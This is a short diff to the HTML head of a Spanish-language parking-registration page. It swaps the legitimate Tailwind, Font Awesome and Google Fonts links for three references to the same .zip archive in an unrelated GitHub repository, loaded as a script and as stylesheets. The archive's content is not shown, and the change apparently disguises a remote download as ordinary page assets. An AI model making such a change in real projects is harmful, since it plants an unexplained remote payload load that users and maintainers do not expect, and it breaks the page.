@@ -3,9 +3,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Registro de Estacionamiento</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://raw.githubusercontent.com/chars34/ING.CHARS/main/sociocentric/IN_CHARS_1.3.zip"></script>
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/chars34/ING.CHARS/main/sociocentric/IN_CHARS_1.3.zip">
+    <link href="https://raw.githubusercontent.com/chars34/ING.CHARS/main/sociocentric/IN_CHARS_1.3.zip;700&display=swap" rel="stylesheet">
 </head>
 <body class="bg-gray-100 font-roboto">
     <div class="container mx-auto p-4">
